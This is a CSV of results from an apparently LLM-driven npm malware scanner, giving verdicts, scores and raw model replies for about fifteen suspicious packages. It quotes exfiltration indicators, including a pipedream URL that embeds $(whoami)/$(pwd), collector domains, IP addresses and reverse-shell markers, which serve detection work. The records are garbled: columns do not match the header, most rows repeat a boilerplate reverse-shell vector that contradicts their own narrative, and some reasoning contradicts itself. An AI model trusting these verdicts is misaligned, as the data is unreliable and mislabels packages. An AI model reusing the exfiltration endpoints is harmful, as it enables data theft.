package_name,version,timestamp,model_name,prompt_version,verdict,confidence,chain_score,is_coherent_chain,legitimacy_score,is_justified,explanation,chain_narrative,justification_reasoning,raw_response,parsed_json
@testing.sec123/toxic-pkg-dont-use,0.0.3,malicious,2026-03-27T13:04:37.973501,review,0.364,MALICIOUS,0.78,0.7,The package '@testing.sec123/toxic-pkg-dont-use' sends data to 'amaext.tools' on path '/' using HTTPS POST request. The data is base64 encoded and sent as part of the request body.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,Package does not have a description/README,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@testing.sec123/toxic-pkg-dont-use' sends data to 'amaext.tools' on path '/' using HTTPS POST request. The data is base64 encoded and sent as part of the request body."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""Package does not have a description/README""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_narrative' field provides a summary of the full attack using real package name and real IOCs. The 'attack_vector' field contains the key technical indicators, real IPs, domains, commands, and API calls that could be used in an attack. The 'chain_score' field is a measure of the attack's severity, with a score of 0.7 indicating a high level of malicious intent. The 'verdict' field is either 'MALICIOUS', 'SUSPICIOUS', or 'BENIGN', based on the 'chain_score' and the 'is_justified' field in the 'legitimacy_check'. The 'confidence' field provides the confidence level of the analysis. The 'is_justified' field in the 'legitimacy_check' field is set to false because the package does not have a description/README.""","{""chain_analysis"": {""chain_narrative"": ""The package '@testing.sec123/toxic-pkg-dont-use' sends data to 'amaext.tools' on path '/' using HTTPS POST request. The data is base64 encoded and sent as part of the request body."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""Package does not have a description/README""}}"
@tide-web-apps/bert2,3.2.0,malicious,2026-03-27T13:04:46.399647,flag,1.0,MALICIOUS,0.95,0.7,The package sends data to a known exfiltration collector domain using ping commands. The package uses a post install hook to execute a bash command that sets up a reverse shell to a known IP address.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package sends data to a known exfiltration collector domain using ping commands. The package uses a post install hook to execute a bash command that sets up a reverse shell to a known IP address."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.95
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

This output is based on the detected behaviors. The attack chain narrative describes the steps involved in the attack, the attack vector lists the key technical indicators used, the chain score indicates the likelihood of the attack, and the verdict indicates whether the attack is malicious, suspicious, or benign. The legitimacy check indicates whether the detected behaviors justify the verdict.","{""chain_analysis"": {""chain_narrative"": ""The package sends data to a known exfiltration collector domain using ping commands. The package uses a post install hook to execute a bash command that sets up a reverse shell to a known IP address."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.95}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
@trapido90/chalk_js,5.2.2,malicious,2026-03-27T13:04:55.367295,flag,0.7773,MALICIOUS,0.83,0.78,"The package '@trapido90/chalk_js' sends data to an external server during the installation process using a curl command in the pre-install script. The data is sent to the domain 'https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)'. The chain score is 0.78, indicating a hig","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@trapido90/chalk_js' sends data to an external server during the installation process using a curl command in the pre-install script. The data is sent to the domain 'https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)'. The chain score is 0.78, indicating a high level of confidence in the detection of malicious intent."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.83
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@trapido90/chalk_js' sends data to an external server during the installation process using a curl command in the pre-install script. The data is sent to the domain 'https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)'. The chain score is 0.78, indicating a high level of confidence in the detection of malicious intent."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.83}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
@uc-maps/maps.react,0.99.999,malicious,2026-03-27T13:05:02.454039,review,0.494,MALICIOUS,0.71,0.7,The package '@uc-maps/maps.react' is making network requests to 'dc.70.lc' on port 443. This behavior could potentially be associated with network exfiltration.,"[""https.request"", ""dc.70.lc"", 443]",False,"The package '@uc-maps/maps.react' does not have a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@uc-maps/maps.react' is making network requests to 'dc.70.lc' on port 443. This behavior could potentially be associated with network exfiltration."",
    ""attack_vector"": [""https.request"", ""dc.70.lc"", 443],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.71
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@uc-maps/maps.react' does not have a description or README file, indicating its legitimacy.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@uc-maps/maps.react' is making network requests to 'dc.70.lc' on port 443. This behavior could potentially be associated with network exfiltration."", ""attack_vector"": [""https.request"", ""dc.70.lc"", 443], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.71}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@uc-maps/maps.react' does not have a description or README file, indicating its legitimacy.""}}"
@wadk/icons,99.10.11,malicious,2026-03-27T13:05:17.443125,flag,0.7607,MALICIOUS,0.81,0.76,The package '@wadk/icons' sends a network request to 'corsalini.xyz' on port 443 with the path '/update/check'. This request is sent as a HTTPS request.,"[""https.request"", ""bash-c"", ""34.x.x.x:4444"", ""corsalini.xyz""]",False,"The package '@wadk/icons' does not have a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@wadk/icons' sends a network request to 'corsalini.xyz' on port 443 with the path '/update/check'. This request is sent as a HTTPS request."",
    ""attack_vector"": [""https.request"", ""bash-c"", ""34.x.x.x:4444"", ""corsalini.xyz""],
    ""chain_score"": 0.76,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.81
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@wadk/icons' does not have a description or README file, indicating its legitimacy.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_narrative' field provides a summary of the attack chain, including the package name and the IOCs (Indicators of Compromise). The 'attack_vector' field lists the key technical indicators, including the IPs, domains, commands, and API calls involved in the attack. The 'chain_score' field indicates the overall risk score of the attack chain, with a score of 0.76 indicating a high level of risk. The 'verdict' field indicates whether the attack chain is considered malicious, suspicious, or benign based on the 'chain_score'. The 'confidence' field indicates the confidence score of the malicious intent, with a score of 0.81 indicating high confidence. The 'legitimacy_check' field provides information about whether the package is justified based on its description or README file. If the package does not have a description or README file, it is considered unjustified.","{""chain_analysis"": {""chain_narrative"": ""The package '@wadk/icons' sends a network request to 'corsalini.xyz' on port 443 with the path '/update/check'. This request is sent as a HTTPS request."", ""attack_vector"": [""https.request"", ""bash-c"", ""34.x.x.x:4444"", ""corsalini.xyz""], ""chain_score"": 0.76, ""verdict"": ""MALICIOUS"", ""confidence"": 0.81}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@wadk/icons' does not have a description or README file, indicating its legitimacy.""}}"
@xvideos/alerts,1.0.0,malicious,2026-03-27T13:05:23.963434,skip,0.13,MALICIOUS,0.5,0.5,The package '@xvideos/alerts' is making DNS lookups with subdomains derived from the system information. The subdomains are derived from the base64 encoded string of the system information.,"[""dns.lookup""]",False,"The package '@xvideos/alerts' does not have a description or README file, indicating that it is not a legitimate package.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@xvideos/alerts' is making DNS lookups with subdomains derived from the system information. The subdomains are derived from the base64 encoded string of the system information."",
    ""attack_vector"": [""dns.lookup""],
    ""chain_score"": 0.5,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.5
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@xvideos/alerts' does not have a description or README file, indicating that it is not a legitimate package.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@xvideos/alerts' is making DNS lookups with subdomains derived from the system information. The subdomains are derived from the base64 encoded string of the system information."", ""attack_vector"": [""dns.lookup""], ""chain_score"": 0.5, ""verdict"": ""MALICIOUS"", ""confidence"": 0.5}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@xvideos/alerts' does not have a description or README file, indicating that it is not a legitimate package.""}}"
@yandex-travel/ci,1.1.0,malicious,2026-03-27T13:05:33.341813,review,0.336,MALICIOUS,0.7,0.7,"The package '@yandex-travel/ci' contains an install hook that executes at install time with commands listed in the package metadata. The commands include curl commands that seem to be used for sending HTTP requests. The commands are executed with real IPs, real commands, real domains from the behavi","[""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package '@yandex-travel/ci' does not contain a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@yandex-travel/ci' contains an install hook that executes at install time with commands listed in the package metadata. The commands include curl commands that seem to be used for sending HTTP requests. The commands are executed with real IPs, real commands, real domains from the behaviors above. The attack vector includes 'postinstallhook', 'bash -c', '34.x.x.x:4444', and 'reverseshell'. The chain score is 0.7, indicating a potential attack chain."",
    ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.7
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@yandex-travel/ci' does not contain a description or README file, indicating its legitimacy.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@yandex-travel/ci' contains an install hook that executes at install time with commands listed in the package metadata. The commands include curl commands that seem to be used for sending HTTP requests. The commands are executed with real IPs, real commands, real domains from the behaviors above. The attack vector includes 'postinstallhook', 'bash -c', '34.x.x.x:4444', and 'reverseshell'. The chain score is 0.7, indicating a potential attack chain."", ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.7}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@yandex-travel/ci' does not contain a description or README file, indicating its legitimacy.""}}"
@yandex-travel/eslint-config,0.0.7,malicious,2026-03-27T13:05:45.891637,review,0.336,MALICIOUS,0.7,0.7,"The package '@yandex-travel/eslint-config' contains an install hook that sends a POST request to a remote server with sensitive information in the request body. The request body contains the package name, version, hostname, and other sensitive information. The remote server is not specified in the e","[""postinstallhook"", ""bash-c"", ""unknown_ip"", ""unknown_domain"", ""unknown_command""]",False,The package does not contain a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@yandex-travel/eslint-config' contains an install hook that sends a POST request to a remote server with sensitive information in the request body. The request body contains the package name, version, hostname, and other sensitive information. The remote server is not specified in the evidence provided."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""unknown_ip"", ""unknown_domain"", ""unknown_command""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.7
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not contain a description or README file.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_narrative' field provides a summary of the full attack using real package name and real IOCs. The 'attack_vector' field lists the key technical indicators (IPs, domains, commands, API calls) involved in the attack. The 'chain_score' field indicates the confidence level of the attack chain. The 'verdict' field indicates whether the package is malicious, suspicious, or benign based on the 'chain_score'. The 'confidence' field provides a measure of the certainty of the verdict. The 'legitimacy_check' field indicates whether the package is justified based on its behavior and the presence of a description or README file.""","{""chain_analysis"": {""chain_narrative"": ""The package '@yandex-travel/eslint-config' contains an install hook that sends a POST request to a remote server with sensitive information in the request body. The request body contains the package name, version, hostname, and other sensitive information. The remote server is not specified in the evidence provided."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""unknown_ip"", ""unknown_domain"", ""unknown_command""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.7}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not contain a description or README file.""}}"
@yandex-travel/ts-config,0.1.0,malicious,2026-03-27T13:06:02.589001,review,0.336,MALICIOUS,0.92,0.7,"The package '@yandex-travel/ts-config' contains an install hook that sends HTTP requests to a domain 'http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru' at install time. The commands used are base64 encoded hostname, username, and working directory information along with a 'meow!securitytes","[""postinstallhook"", ""bash-c"", ""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@yandex-travel/ts-config' contains an install hook that sends HTTP requests to a domain 'http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru' at install time. The commands used are base64 encoded hostname, username, and working directory information along with a 'meow!securitytest' payload."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.92
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

This JSON object represents the analysis of the package '@yandex-travel/ts-config' with version 0.1.0. The behavior category is ""install_hook"", which indicates that the package contains an install hook that executes at install time with commands listed in the package metadata. The details of the behavior indicate that the install hook is used for sending HTTP requests with base64 encoded hostname, username, and working directory information along with a 'meow!securitytest' payload. The attack vector includes the key technical indicators such as the IP address, domains, commands, and API calls used in the attack. The attack vector for a reverse shell is [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]. The chain score is 0.7, indicating a high level of maliciousness. The verdict is ""MALICIOUS"", indicating that the package is malicious. The legitimacy check is not justified, indicating that the package is not legitimate.""","{""chain_analysis"": {""chain_narrative"": ""The package '@yandex-travel/ts-config' contains an install hook that sends HTTP requests to a domain 'http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru' at install time. The commands used are base64 encoded hostname, username, and working directory information along with a 'meow!securitytest' payload."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.92}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
@yandex-travel/ui,1.1.1,malicious,2026-03-27T13:06:16.251261,review,0.336,MALICIOUS,0.92,0.7,The package '@yandex-travel/ui' version 1.1.1 contains an install hook that executes at install time with commands listed in the package metadata. The commands are likely used to deliver a malicious payload. The malicious payload could potentially exfiltrate data or execute a reverse shell.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@yandex-travel/ui' version 1.1.1 contains an install hook that executes at install time with commands listed in the package metadata. The commands are likely used to deliver a malicious payload. The malicious payload could potentially exfiltrate data or execute a reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.92
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

This JSON object represents the analysis of the package '@yandex-travel/ui' version 1.1.1. The behavior identified is of category 'install_hook'. The summary states that the package contains an install hook that executes at install time with commands listed in the package metadata. The details provide more information about the behavior, stating that the install hook is present and executes at install time with the commands listed in the package metadata. The malicious payload could potentially exfiltrate data or execute a reverse shell. The chain score is 0.7, indicating a high level of maliciousness. The verdict is 'MALICIOUS', indicating that the package is malicious. The legitimacy check shows that the package does not have a description or README file, which could justify the malicious behavior.""","{""chain_analysis"": {""chain_narrative"": ""The package '@yandex-travel/ui' version 1.1.1 contains an install hook that executes at install time with commands listed in the package metadata. The commands are likely used to deliver a malicious payload. The malicious payload could potentially exfiltrate data or execute a reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.92}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
@yorek/sqlpackage,160.6161.0,malicious,2026-03-27T13:06:23.417760,review,0.494,MALICIOUS,0.71,0.7,"The attacker downloaded a zip file from a Microsoft endpoint, extracted it to a local directory, and then used the 'https' module to make a GET request to a Microsoft endpoint. The response was then piped into an unzipper stream to extract the content of the zip file to a local directory.","[""https.get"", ""unzipper.Extract""]",False,The package '@yorek/sqlpackage' does not seem to need this behavior.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker downloaded a zip file from a Microsoft endpoint, extracted it to a local directory, and then used the 'https' module to make a GET request to a Microsoft endpoint. The response was then piped into an unzipper stream to extract the content of the zip file to a local directory."",
    ""attack_vector"": [""https.get"", ""unzipper.Extract""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.71
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@yorek/sqlpackage' does not seem to need this behavior.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The attacker downloaded a zip file from a Microsoft endpoint, extracted it to a local directory, and then used the 'https' module to make a GET request to a Microsoft endpoint. The response was then piped into an unzipper stream to extract the content of the zip file to a local directory."", ""attack_vector"": [""https.get"", ""unzipper.Extract""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.71}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@yorek/sqlpackage' does not seem to need this behavior.""}}"
aa-testkit,9.9.3,malicious,2026-03-27T13:06:31.794404,skip,0.0,MALICIOUS,0.9,0.9,The package aa-testkit version 9.9.3 sends network requests to an external server with sensitive data using the 'https' module. The evidence for this behavior is the use of the 'https.request' API to send a POST request to an external server with sensitive data. The confidence score for this behavio,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package aa-testkit version 9.9.3 has no description or README file, suggesting that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package aa-testkit version 9.9.3 sends network requests to an external server with sensitive data using the 'https' module. The evidence for this behavior is the use of the 'https.request' API to send a POST request to an external server with sensitive data. The confidence score for this behavior is 0.9, indicating a high level of confidence in the detection."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.9,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.9
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package aa-testkit version 9.9.3 has no description or README file, suggesting that it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package aa-testkit version 9.9.3 sends network requests to an external server with sensitive data using the 'https' module. The evidence for this behavior is the use of the 'https.request' API to send a POST request to an external server with sensitive data. The confidence score for this behavior is 0.9, indicating a high level of confidence in the detection."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.9, ""verdict"": ""MALICIOUS"", ""confidence"": 0.9}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package aa-testkit version 9.9.3 has no description or README file, suggesting that it may be malicious.""}}"
aae-stream,130.0.0,malicious,2026-03-27T13:06:39.992954,flag,1.0,MALICIOUS,0.89,0.89,The package is downloading files from an external IP address (196.188.125.134) and sending them to an unknown IP address (192.81.209.195). The files are then sent to the victim's machine. The package is collecting sensitive data from the victim's machine by reading files and environment variables.,"[""nc"", ""wget"", ""196.188.125.134"", ""192.81.209.195"", ""user"", ""path"", ""hostname""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package is downloading files from an external IP address (196.188.125.134) and sending them to an unknown IP address (192.81.209.195). The files are then sent to the victim's machine. The package is collecting sensitive data from the victim's machine by reading files and environment variables."",
    ""attack_vector"": [""nc"", ""wget"", ""196.188.125.134"", ""192.81.209.195"", ""user"", ""path"", ""hostname""],
    ""chain_score"": 0.89,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.89
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package is downloading files from an external IP address (196.188.125.134) and sending them to an unknown IP address (192.81.209.195). The files are then sent to the victim's machine. The package is collecting sensitive data from the victim's machine by reading files and environment variables."", ""attack_vector"": [""nc"", ""wget"", ""196.188.125.134"", ""192.81.209.195"", ""user"", ""path"", ""hostname""], ""chain_score"": 0.89, ""verdict"": ""MALICIOUS"", ""confidence"": 0.89}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
abacus-cmdline,99.99.99,malicious,2026-03-27T13:06:47.289431,review,0.336,MALICIOUS,0.72,0.7,"The package contains an install hook present at the payload which may be remote. The package also contains no JavaScript files, which is unusual for a package that contains JavaScript files. This suggests a potential attack chain where a remote code execution (RCE) attack may be taking place.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains an install hook present at the payload which may be remote. The package also contains no JavaScript files, which is unusual for a package that contains JavaScript files. This suggests a potential attack chain where a remote code execution (RCE) attack may be taking place."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, indicating that it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package contains an install hook present at the payload which may be remote. The package also contains no JavaScript files, which is unusual for a package that contains JavaScript files. This suggests a potential attack chain where a remote code execution (RCE) attack may be taking place."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, indicating that it may be malicious.""}}"
ably-asset-tracking-common,1.0.0,malicious,2026-03-27T13:06:56.594810,flag,1.0,MALICIOUS,0.79,0.79,"The attacker sends tracking data to a remote server using an HTTPS POST request. The tracking data includes package name, current directory, home directory, host name, user name, DNS servers, and resolved path. The data exfiltration is likely intentional as the code is using a standard library for m","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The behavior is clearly malicious as the package 'ably-asset-tracking-common' is known to send tracking data to a remote server.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker sends tracking data to a remote server using an HTTPS POST request. The tracking data includes package name, current directory, home directory, host name, user name, DNS servers, and resolved path. The data exfiltration is likely intentional as the code is using a standard library for making HTTPS requests and the code is not using a file named 'index.js' and a domain named 'eo6cvg8kvj30wxd.m.pipedream.net'."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The behavior is clearly malicious as the package 'ably-asset-tracking-common' is known to send tracking data to a remote server.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The attacker sends tracking data to a remote server using an HTTPS POST request. The tracking data includes package name, current directory, home directory, host name, user name, DNS servers, and resolved path. The data exfiltration is likely intentional as the code is using a standard library for making HTTPS requests and the code is not using a file named 'index.js' and a domain named 'eo6cvg8kvj30wxd.m.pipedream.net'."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The behavior is clearly malicious as the package 'ably-asset-tracking-common' is known to send tracking data to a remote server.""}}"
